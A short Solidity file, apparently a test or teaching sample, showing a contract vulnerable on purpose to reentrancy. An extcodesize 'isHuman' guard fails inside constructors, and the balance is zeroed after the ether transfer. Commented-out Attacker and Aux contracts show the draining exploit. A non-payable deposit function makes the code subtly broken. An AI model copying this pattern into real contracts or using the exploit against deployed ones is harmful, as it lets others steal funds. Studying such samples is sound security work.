pragma solidity ^0.4.24;

// SPDX-License-Identifier: GPL-3.0
contract C {
    mapping (address => uint256) private balances;


    // this implementation is unsafe as it allows calls from costructor bodies
    modifier isHuman() {
        address _addr = msg.sender;
        uint256 _codeLength;
        assembly {_codeLength := extcodesize(_addr)}
        require(_codeLength == 0, "sorry humans only");
        _;
    }

    function transfer(address from, address to) isHuman() public {
        uint256 amt = balances[from];
        require(amt > 0, "Insufficient funds");
        (bool success, ) = to.call.value(amt)("");
        require(success, "Call failed");
        balances[from] = 0;    // side effect after call
    }

    function deposit() public  isHuman() {
        balances[msg.sender] += msg.value;       
    }
}

// an attacker performs from off-chain:
//    deposit{value: 100}();
//    transfer(SELF, attacker);   // where SELF is the EOA of the attacker and attacker is an instance of the Attacker contract
// contract Attacker {

//     address attacker_eoa;
//     uint256 public counter = 2;

//     constructor()  public {
//         attacker_eoa = msg.sender;
//     }
    
//     function()  external {
//         // now this contract has functiond the amount (100)
//         // and a new contract is instantiated, passing addresses for reentering
//         if (counter > 0) {
//             counter--;
//             new Aux(attacker_eoa, address(this), msg.sender);
//         }
//     }
// }

// contract Aux {
//     constructor(address attacker_eoa, address attacker, address victim)  public {
//         // within this constructor a reentrancy is performed and more ether (100) is transfered to the Attacker contract again
//         // the isHuman guard succeedes because we are INSIDE a constructor
//         C(victim).transfer(attacker_eoa, attacker);
//     }
// }